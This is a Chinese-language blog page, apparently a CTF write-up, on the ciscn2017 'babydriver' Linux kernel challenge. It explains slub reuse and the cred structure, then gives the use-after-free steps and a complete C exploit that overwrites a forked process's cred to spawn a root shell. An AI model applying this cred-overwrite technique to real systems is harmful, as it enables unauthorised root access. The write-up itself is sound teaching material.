@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="通过控制cred结构体来获得权限是kernel pwn中比较基础的做法，结合一些漏洞往往可以造成意想不到的结果。">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[KERNEL UAF]ciscn2017-babydriver">
+<meta property="og:url" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/index.html">
+<meta property="og:site_name" content="cd &#x2F;pwn">
+<meta property="og:description" content="通过控制cred结构体来获得权限是kernel pwn中比较基础的做法，结合一些漏洞往往可以造成意想不到的结果。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/open.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/close.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/ioctl.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/write.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/cred.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/root.png">
+<meta property="og:updated_time" content="2020-04-07T08:02:53.579Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="[KERNEL UAF]ciscn2017-babydriver">
+<meta name="twitter:description" content="通过控制cred结构体来获得权限是kernel pwn中比较基础的做法，结合一些漏洞往往可以造成意想不到的结果。">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/open.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>[KERNEL UAF]ciscn2017-babydriver | cd /pwn</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cd /pwn</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Eros John">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cd /pwn">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">[KERNEL UAF]ciscn2017-babydriver
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-04-07 14:35:37 / 修改时间：16:02:53" itemprop="dateCreated datePublished" datetime="2020-04-07T14:35:37+08:00">2020-04-07</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Kernel/" itemprop="url" rel="index"><span itemprop="name">Kernel</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>通过控制cred结构体来获得权限是kernel pwn中比较基础的做法，结合一些漏洞往往可以造成意想不到的结果。</p>
+<a id="more"></a>
+<hr>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><p>内核是操作系统的核心，目的是为上层提供一个接口，和CPU进行交互，方式就是通过设置各种CPU所需要的结构，让CPU能够提供相应的功能，比如设置虚拟内存所需要的一些结构，使得CPU能够顺利识别，从而提供虚拟内存功能。和操作系统进行交互可以通过系统调用等方式实现。</p>
+<h2 id="slub重用"><a href="#slub重用" class="headerlink" title="slub重用"></a>slub重用</h2><p>其作用是为了减少slub的种类，比如我有个kmalloc-8类型的slub，里面每个对象大小是8，而我某个驱动想申请自己所属的slub，其对象大小是6，系统实际把kmalloc-8这个类型的slub返回给了驱动，之后驱动中分配对象时实际上就是从kmalloc-8中分配对象，这就是slub重用，将相近大小的slub共用一个slub类型，虽然会造成一些内碎片，但是大大减少了slub种类过多以及减少使用了跟多的内存。slab分配器严格按照cache去区分，不同cache的无法分配在一页内，slub分配器则较为宽松，不同cache如果分配相同大小，可能会在一页内。</p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>拿到一个压缩包 babydriver.tar，解压之后获得三个文件。<br>其中</p>
+<ul>
+<li>boot.sh : 启动脚本</li>
+<li>bzImage : 压缩的内核映像</li>
+<li>rootfs.cpio : 文件系统</li>
+</ul>
+<p>接着解压 rootfs.cpio<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir fs</span><br><span class="line"><span class="built_in">cd</span> fs</span><br><span class="line">cp ../rootfs.cpio ./</span><br><span class="line">cpio -idmv &lt; rootfs.cpio</span><br></pre></td></tr></table></figure></p>
+<p>当然在一些系统中也可以直接右键解压。<br>在其中找到init文件<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure></p>
+<p>可以看到内核版本4.4.72，加载了 babydriver.ko 文件。</p>
+<pre><code># checksec --file babydriver.ko
+Arch:     amd64-64-little
+RELRO:    No RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x0)
+</code></pre><p>接着进行RE。<br>可以看到在对设备进行open操作时，相关数据是存储在bss段上面。如果再次打开一个，就会把第一次的数据覆盖掉。<br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/open.png" alt="open"><br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/close.png" alt="close"><br>command为0x10001时，可以改变全局变量。<br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/ioctl.png" alt="ioctl"><br>往全局变量里写buffer的n个长度。<br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/write.png" alt="write"></p>
+<p>以下是cred结构体的描述<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
+<p>cred结构在每一个进程中都有一个，并且保存了该进程的权限信息。</p>
+<h1 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h1><ol>
+<li>打开两次fd1，fd2。</li>
+<li>通过fd1，修改buf_len为CRED_SIZE。</li>
+<li>关闭fd1，此时driver_buf被kfree掉。</li>
+<li>fork一个进程，cred结构体被分配到driver_buf位置。</li>
+<li>通过fd2往driver_buf里面写0，覆盖到egid为止，此时该进程权限被认为是root。</li>
+</ol>
+<h2 id="cred结构体大小"><a href="#cred结构体大小" class="headerlink" title="cred结构体大小"></a>cred结构体大小</h2><p>可以通过源码直接算出来，也可以写一个demo测一下，这里写个小demo。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> <span class="title">c1</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"&lt;1&gt; Hello world!\n"</span>);</span><br><span class="line">    printk(<span class="string">"size of cred : %d \n"</span>,<span class="keyword">sizeof</span>(c1));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">"&lt;1&gt; Bye, cruel world\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure></p>
+<pre><code>#cat Makefile
+CURR_PATH   = $(shell pwd)
+KERNEL_PATH = /home/griffin/kernel/linux-4.4.72
+BUILD_PATH  = $(CURR_PATH)/build 
+obj-m := credSize.o
+default:
+    make -C $(KERNEL_PATH) M=$(CURR_PATH) modules
+.PHONY:clean
+clean:
+    @$(RM) *.o  *.mod.* Module.* modules.*
+</code></pre><p>大小为168<br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/cred.png" alt="cred"><br>gcc -o exp -static exp.c<br>把exp放进rootfs再打包成rootfs.cpio</p>
+<pre><code>find . | cpio -o --format=newc &gt; ../rootfs.cpio
+</code></pre><p>运行boot.sh，运行exp后get root。<br><img src="/2020/04/07/KERNEL-UAF-ciscn2017-babydriver/root.png" alt="root"></p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VULN_DRIVER <span class="meta-string">"/dev/babydev"</span></span></span><br><span class="line"><span class="keyword">char</span> ZERO_BUF[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1,fd2;</span><br><span class="line">    fd1 = open(VULN_DRIVER, O_RDWR); </span><br><span class="line">    fd2 = open(VULN_DRIVER, O_RDWR); </span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, CRED_SIZE);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"fork error"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!pid)</span><br><span class="line">    &#123;</span><br><span class="line">        write(fd2, ZERO_BUF, <span class="number">28</span>);</span><br><span class="line">        <span class="keyword">if</span>(!getuid())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"GET ROOT"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"GET ROOT FAILED!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/86490" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86490</a><br><a href="https://www.cnblogs.com/tolimit/p/4654109.html" target="_blank" rel="noopener">https://www.cnblogs.com/tolimit/p/4654109.html</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/13/IO-FILE-pwnable-tw-bookwriter/" rel="next" title="[_IO_FILE]pwnable.tw-bookwriter">
+                <i class="fa fa-chevron-left"></i> [_IO_FILE]pwnable.tw-bookwriter
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                    <span class="site-state-item-count">1</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
